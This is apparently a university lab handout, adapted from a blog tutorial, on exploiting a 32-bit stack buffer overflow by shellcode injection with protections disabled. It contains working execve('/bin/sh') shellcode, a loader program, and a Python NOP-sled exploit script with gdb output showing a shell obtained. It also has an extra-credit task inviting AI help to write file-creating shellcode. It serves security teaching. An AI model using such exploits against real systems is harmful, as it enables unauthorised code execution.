

# Buffer Overflow: Code Execution By Shellcode Injection 

Adapted from [https://hg8.sh/posts/binary-exploitation/buffer-overflow-code-execution-by-shellcode-injection/]



This details how to exploit a buffer overflow in
order to achieve remote code execution via shellcode injection.

# [](#Setting-up-our-environment "Setting up our environment") Setting up our environment 

sudo apt update
sudo apt install libc6-dev-i386

# Background

As previously stated in the introduction, today's memory layout of a
running application has become significantly more complex due to the
implementation of various security measures. These measures have made
exploiting vulnerabilities such as buffer overflow quite challenging.
Some of the common and highly effective security measures include for
example:

-   **ASLR** protection
    (***A**ddress **S**pace **L**ayout **R**andomization*) randomly
    arranges the address space positions of key data areas of a program.
    At each new execution, the stored data is placed in different memory
    spaces.
-   **SSP** protection (***S**tack-**S**mashing **P**rotector*) detects
    stack buffer overrun by aborting if a secret value on the stack is
    changed. These secret values ("Canaries") are inserted between data
    segments in the stack. The integrity of the secrets are checked and
    the program immediately interrupt if modification is detected.
-   No possible Stack or Heap execution, these memory spaces are
    intended to only contain variables and pointers but never executable
    code.

For the learning purpose of our example, we are going to disable these
protections and force a 32 bits compilation.

```bash
 sudo echo 0 > /proc/sys/kernel/randomize_va_space # disable ASLR
 gcc -m32 -g -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack vuln.c -o vuln
 ```

Flags explanation:

`-m32`: Compile in 32 bits

`-g`: Generates debug information to be used by GDB debugger.

`-mpreferred-stack-boundary=2`: Ensure that the stack is set up into
4-bytes increments, preventing optimisation of the stack segmentation
that could make our example confusing.

`-fno-stack-protector`: Disable Stack Smashing protection.

`-z execstack`: Disable NX (allowing stack segment to be executable).

# [](#Overflowing-the-stack "Overflowing the stack")Overflowing the stack 

Let's now open our program with `gdb`:

```bash
gdb ./vuln
Reading symbols from ./vuln...
(gdb) list
1       #include <string.h>
2
3       int main (int argc, char** argv) {
4         char buffer [500];
5         strcpy(buffer, argv[1]);
6         return 0;
7       }
(gdb)

```

This is what what our program stack will look like:

![memory segmentation
representation,pdfwidth=50%,scaledwidth=50%](https://user-images.githubusercontent.com/9076747/212431420-c3663e95-2fd7-4e41-b677-0fed2cac4a1b.svg)

`Buffer:` A contiguous, fixed-size block of memory used to temporarily store data. In programming, this is often an array on the stack that can be overflowed if user input isn't properly checked.

`EBX:` A 32-bit general-purpose register in the x86 architecture. While it can be used for any task, its name stands for "Base Index" and it was often used to store the base address of a data segment.

`EBP:` The 32-bit Base Pointer (or Frame Pointer) register. It points to the base of the current function's stack frame, providing a stable reference point for accessing local variables and function arguments.

`EIP:` The 32-bit Instruction Pointer register. This is a critical register that holds the memory address of the very next instruction the CPU will execute. Controlling EIP is the primary goal of many buffer overflow exploits.

In order to exploit the buffer overflow in our program, we are going to
pass an input bigger than 500 characters to our `buffer[]` variable.

It's important to note that, even though the stack itself grows upward
from high-memory to lower-memory addresses, the buffer itself is filled
from lower to higher memory addresses.

In our example, when we input a string longer than 500 characters, it
will begin overwriting the register that's lower on the stack (and
higher up in the memory).

For example if we use a 501 characters long input, the following will
happen:

![memory representation buffer
overflow, pdfwidth=50%,scaledwidth=50%](https://user-images.githubusercontent.com/9076747/212432871-2764417e-d29b-400f-9abe-0265c1d4abab.svg)

Well let's now see in practice what happens when we input a 501 long
string to our program.

We can use python to generate a string made of 501 occurrences of the
letter 'A' (`0x41` is hexadecimal for 65, which is the ASCII-code for
the letter 'A').

From `gdb` this can be done using the `run` command:

```bash
gdb ./vuln
Reading symbols from vuln...
(gdb) run $(python -c "print('\x41'*501)")
[Inferior 1 (process 3508) exited normally]
```


Nothing happens, it's normal since EBX is not a critical register in our
example program.

Let's now add a breakpoint in order to highlight how the EBX register
got overwritten with an extra `x41` ('A'):

```bash
(gdb) disassemble main
Dump of assembler code for function main:
   0x08049176 <+0>:     push   ebp
   0x08049177 <+1>:     mov    ebp,esp
   0x08049179 <+3>:     push   ebx
   0x0804917a <+4>:     sub    esp,0x1f4
   0x08049180 <+10>:    call   0x80491ae <__x86.get_pc_thunk.ax>
   0x08049185 <+15>:    add    eax,0x2053
   0x0804918a <+20>:    mov    edx,DWORD PTR [ebp+0xc]
   0x0804918d <+23>:    add    edx,0x4
   0x08049190 <+26>:    mov    edx,DWORD PTR [edx]
   0x08049192 <+28>:    push   edx
   0x08049193 <+29>:    lea    edx,[ebp-0x1f8]
   0x08049199 <+35>:    push   edx
   0x0804919a <+36>:    mov    ebx,eax
   0x0804919c <+38>:    call   0x8049050 <strcpy@plt>
   0x080491a1 <+43>:    add    esp,0x8
   0x080491a4 <+46>:    mov    eax,0x0
   0x080491a9 <+51>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080491ac <+54>:    leave
   0x080491ad <+55>:    ret
End of assembler dump.
```

Now set a break point where the program leaves the main functon in the above example it is at location 
`0x080491ac`

```bash
(gdb) break *0x080491ac
Breakpoint 1 at 0x80491ac: file vuln.c, line 7.
```
Re-run your program with the following:

```bash
(gdb) run $(python -c "print('\x41'*501)")                                                                             
Starting program: ./vuln $(python -c "print('\x41'*501)")

Breakpoint 1, 0x080491ac in main (argc=2, argv=0xffffd0b4) at vuln.c:7
7       }
```

The above writes 501 `A chars` to memory

---
`Action:`  Take a screen shout of your main memory layout
---

Now by checking the registers with the `info registers` 
Is the register being overwritten?  You should see '41'.
Increase the number of `A` chars you are writting (remember \x41) 

verify that the `ebx` address is being overwritten :

```bash
(gdb) info registers
[...]
ebx            0xf7fa0041          -134610879
[..]
```

Question: How many chars are needed to overwrite the whole `ebx`
register?  (hint should look like this: `ebx            0x41414141`)

---
`Action:`  Take a screen shout of your main memory layout
---



We can also visualize what the stack looks like in memory from gdb with
`x/12x $sp-20`. Let's decompose the command to understand how it works:

-   `x/14x` displays 14 bytes of memory in a hexadecimal format.
-   `$sp+460` starts the memory reading from the stack pointer (\$sp)
    position offset by +460, which is around where our `ebx` register is
    located.

Beforehand let's slightly tweak our payload to make it more visible on
the stack representation, instead of 'A' we will replace the 4
overflowed bytes with 'B' (`x42`):

```bash
(gdb) run $(python -c "print('\x41'*500+'\x42'*4)") 
Starting program: ./vuln $(python -c "print('\x41'*500+'\x42'*4)") 

Breakpoint 1, 0x080491ac in main (argc=2, argv=0xffffd0b4) at vuln.c:7
7       } 
(gdb) x/14x $sp+460
0xffffcfbc:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfcc:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfdc:     0x41414141      0x41414141      0x42424242      0x00000000
0xffffcfec:     0xf7dad119      0x00000002
```

Now let's overwrite every register following our buffer, `ebx` with
'BBBB', `ebp` with 'CCCC' and `eip` with 'DDDD':

```bash
(gdb) run $(python -c "print('\x41'*500+'\x42'*4+'\x43'*4+'\x44'*4)") 

Program received signal SIGSEGV, Segmentation fault.
0x44444444 in ?? ()
```
```bash
(gdb) info registers
[...]
ebx            0x42424242          1111638594
esp            0xffffcff0          0xffffcff0
ebp            0x43434343          0x43434343
esi            0x804b0e0           134525152
edi            0xf7ffcb80          -134231168
eip            0x44444444          0x44444444
[...]
```

```bash
(gdb) (gdb) x/14x $sp+460
0xffffcfbc:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfcc:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcfdc:     0x41414141      0x41414141      0x42424242      0x43434343
0xffffcfec:     0x44444444      0x00000000
```

---
`Action:`  Take a screen shout of your memory layout
---

Our stack now looks like this:

![memory buffer overflow payload
injection](https://user-images.githubusercontent.com/9076747/215349720-cd619f4d-58d5-4be6-a38e-aaecc765b6d3.svg)

We achieved full control of adjacent memory registers. So what can we do
with such access ? Let's move on to exploitation.

# [](#Exploitation "Exploitation")Exploitation 

The last register we manage to overwrite is `eip`.

The EIP register holds the "Extended Instruction Pointer" for the stack.
In other words, it tells the computer where to go next to execute the
next command and controls the flow of a program.

This means that if we can input malicious code into the program, we can
use the buffer overflow to overwrite the `eip` register to point to the
memory address of the malicious code.

And that's exactly what we are going to do now, and we will start by
crafting a shellcode.

## [](#Shellcode-Creation "Shellcode Creation")Shellcode Creation 

First of all, what is a shellcode ?

A shellcode is a small piece of code used as payload when exploiting an
overflow vulnerability. Historically it's called "shellcode" because it
typically starts a command shell from which the attacker can control the
compromised machine.

In our case, we will inject a shellcode into our buffer in order to have
it get executed later on.\
[Wikipedia](https://en.wikipedia.org/wiki/Shellcode) defines the writing of shellcode "as much of an art as
it is a science", since shellcode depends on the operating system, CPU
architecture and is commonly written in Assembly.

You can easily find plenty on the internet. For our example we are going
to use a very common and simple
[shellcode](http://shell-storm.org/shellcode/files/shellcode-827.html){target="_blank"
rel="noopener"} for x86 which executes a `/bin/sh` shell.

Here is a quick overview of this shellcode:

```bash
xor eax, eax      ; put 0 into eax
push eax          ; push 4 bytes of null from eax to the stack
push 0x68732f2f   ; push "//sh" to the stack
push 0x6e69622f   ; push "/bin" to the stack
mov ebx, esp      ; put the address of "/bin//sh" to ebx, via esp
push eax          ; push 4 bytes of null from eax to the stack
push ebx          ; push ebx to the stack
mov ecx, esp      ; put the address of ebx to ecx, via esp
mov al, 0xb       ; put 11 into eax, since execve() is syscall #11
int 0x80          ; call the kernel to make the syscall happen
```

This code can be assembled and linked using `nasm` to create an
executable binary program as an Executable and Linking Format (ELF)
binary:

```bash
nasm -f elf shellcode.asm
```

Now we need to disassemble it in order to get the shellcodes bytes:

```bash
objdump -d -M intel shellcode.o

shellcode.o:     file format elf32-i386

Disassembly of section .text:

00000000 <.text>:
   0:   31 c0                   xor    eax,eax
   2:   50                      push   eax
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx,esp
   f:   50                      push   eax
  10:   53                      push   ebx
  11:   89 e1                   mov    ecx,esp
  13:   b0 0b                   mov    al,0xb
  15:   cd 80                   int    0x80
```

We can now easily extract the hexadecimal shellcode, either by hand or
with some bash-fu:

```bash
objdump -d ./shellcode.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

Ooutput:
```
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```

## [](#Shellcode-Testing "Shellcode Testing")Shellcode Testing

Now to be sure our shellcode works, let's write a simple program to run
it on our machine:

```bash
#include <stdio.h>
#include <string.h>

int main(){
    char shellcode[] = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
    int (*ret)() = (int(*)())shellcode;
    return ret();
}
```

Let's run it:

```bash
gcc -m32 -z execstack shellcode-loader.c -o shellcode-loader
[hg8@archbook ~]$ ./shellcode-loader
sh-5.1$ 
```

All is good, let's now inject the shellcode into our vulnerable program.

## [](#Shellcode-Injection "Shellcode Injection")Shellcode Injection 

We now need to make our vulnerable program execute our shellcode. To do
so we will inject the shellcode in the input data payload, for it to be
stored in our buffer.

The next step will be to have our return address point to the memory
location where our shellcode is stored in order for it to be executed.

Since memory may change a bit during program execution and we don't know
the exact location of our shellcode we will use the NOP-sled technique.

### [](#NOP-sled "NOP-sled")NOP-sled 

![NOP
Sled](https://image.slidesharecdn.com/bsidesvienna-2014-miroslavstampar-smashingthebuffer-141123103432-conversion-gate02/95/smashing-the-buffer-19-638.jpg?cb=1416739072)

A NOP sled, also known as a NOP slide, is a technique used to help
ensure that a shellcode is executed even if the exact memory location of
the exploit payload is not known.

The NOP, or No-Operation, instruction is a machine language instruction
that performs no operation and takes up one machine cycle. NOP sled
takes advantage of this instruction by creating a sequence of NOP
instructions that can serve as a landing pad for the program execution
flow.

We will craft a sequence of NOP instructions followed by our shellcode.
The idea is that if the execution flow is redirected to any point within
the NOP sled, the CPU will execute the NOP instructions and keep moving
forward until it hits the shellcode.

When utilizing a NOP-sled, the precise location of the shellcode within
the buffer doesn't matter for the return address to reach it. What we do
know is that it will reside somewhere within the buffer, and its length
will be 25 bytes.

With our shellcode of 25 bytes and a payload of 512 bytes, we have 487
bytes to fill with NOP, which we will divide like so:

Payload: `[ NOP SLED] [ SHELLCODE ] [ RETURN ADDRESS ]`

### [](#Crafting-our-exploit "Crafting our exploit")Crafting our exploit

We will use a Python script to craft our exploit, since we use Python 3
it's important to use `bytes` type.

In addition, since we are working on x86, the hexadecimal value for NOP
instructions is `0x90`.

Save the following as exploit.py

```bash
import sys

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
eip = b"\x43\x43\x43\x43" * 10
nop = b"\x90" * 447
buff = nop + shellcode + eip

sys.stdout.buffer.write(buff) 
```

Since we don't know for now what the return address (`eip`) will be, we
currently replace it with `C` (`x43`) that we repeat 10 times to have a
bit of padding between our shellcode and the stack.

Our NOP sled is being repeated 447 times since we need to write 512
bytes to overwrite the return address:

```bash
512        - (4 * 10) -     25    =     447
Total size -    eip   - shellcode =   nop sled.
```

Here is what we expect our memory to looks like after execution of our
payload:

![Stack Overflowed shellcode
injection](https://github.com/hg8/hg8.github.io/assets/9076747/7968b3ab-4e06-482b-a03d-ac19f7e117cb)

Let's run our payload:

```bash
gdb ./vuln
Reading symbols from vuln2-nosec...
(gdb) run $(python exploit-test.py)
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
```

We get exactly what we were looking for, a segmentation fault since we
didn't provide a valid return address yet. Let's now inspect our memory
to define what the return address should be.

When inspecting the memory, we can see our payload was injected as
expected:

```bash
(gdb) x/16x $sp+430
0xffffcfee:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffcffe:	0x50c03190	0x732f6e68	0x2f2f6868	0xe3896962
0xffffd00e:	0x53e28950	0x0bb0e189	0x434380cd	0x43434343
0xffffd01e:	0x43434343	0x43434343	0x43434343	0x43434343
```

![buffer overflow memory
inspection](https://github.com/hg8/hg8.github.io/assets/9076747/a8b81bb7-2590-47e9-bc15-c2071f7d7f03)

Let's now pick any memory address within the `x90` NOP sled area before
the shellcode to be our return address. From the screenshot above we can
pick `0xffffcfee` for example.


Since Intel CPUs are [little
endian](https://en.wikipedia.org/wiki/Endianness), we need to reverse the address for our payload.

Our script becomes:

```bash
import sys

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
eip = b"\xee\xcf\xff\xff" * 10
nop = b"\x90" * 447
buff = nop + shellcode + eip

sys.stdout.buffer.write(buff) 
```

Note:  Pay close attention to the order of the bytes!!

If everything goes fine, our program `strcpy` will copy our string, and
when it will try to return it will load our injected return value,
redirecting to the NOP Sled, followed by the shellcode that will then be
executed.

Let's give it a try:

```bash
 gdb ./vuln
(gdb) run $(python exploit.py)

Using host libthread_db library "/usr/lib/libthread_db.so.1".
process 6722 is executing new program: /usr/bin/bash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
sh-5.1$
```

And here we go! The buffer overflow was successfully exploited,
resulting in obtaining access to a command shell.


# Extra Credit

Modiy your shell code to create a file in the executable's directory called evil.txt
Take a screen shot of the directory after it is run and hand in the source to your shellcode as a shellcode_evil.asm

You can (and are encouraged to) use AI to help generate the shellcode.


# What to hand in

1. PDF with screen shots.  Annotate the images and explain what is going on in each  (if you could not get everything to work hand in screenshot of what you tried and annotate what you did and what you think you might try differently)
2. Zip file of the vuln.c code your shellcode.asm shell_loader.c the exploit.py file


# Clean Up
re-enable ASLR:

```bash
echo 2 > /proc/sys/kernel/randomize_va_space
```


## [](#References "References")References 

-   [Stack Smashing
    Protector](https://wiki.osdev.org/Stack_Smashing_Protector){target="_blank"
    rel="noopener"}
-   [Address space layout
    randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization){target="_blank"
    rel="noopener"}
-   [Understanding stack alignment
    enforcement](https://stackoverflow.com/questions/47411158/understanding-stack-alignment-enforcement){target="_blank"
    rel="noopener"}
-   [Buffer Overflow -
    Exploitation](https://en.wikipedia.org/wiki/Buffer_overflow#Exploitation){target="_blank"
    rel="noopener"}
-   [Buffer Overflow - Protective
    Countermeasures](https://en.wikipedia.org/wiki/Buffer_overflow#Protective_countermeasures){target="_blank"
    rel="noopener"}
-   [Data structure
    alignment](https://en.wikipedia.org/wiki/Data_structure_alignment){target="_blank"
    rel="noopener"}
-   [How to look at the stack with
    gdb](https://jvns.ca/blog/2021/05/17/how-to-look-at-the-stack-in-gdb/){target="_blank"
    rel="noopener"}
-   [Writing Shellcode for Linux and
    \*BSD](http://www.kernel-panic.it/security/shellcode/shellcode5.html){target="_blank"
    rel="noopener"}
-   [Linux Shellcode 101: From Hell to
    Shell](https://axcheron.github.io/linux-shellcode-101-from-hell-to-shell/){target="_blank"
    rel="noopener"}
-   [Linux/x64 - execve(/bin/sh) Shellcode (23
    bytes)](https://www.exploit-db.com/exploits/46907){target="_blank"
    rel="noopener"}
-   [Two basic ways to run and test
    shellcode](http://disbauxes.upc.es/code/two-basic-ways-to-run-and-test-shellcode/){target="_blank"
    rel="noopener"}
-   [Running a Buffer Overflow Attack -
    Computerphile](https://www.youtube.com/watch?v=1S0aBV-Waeo){target="_blank"
    rel="noopener"}

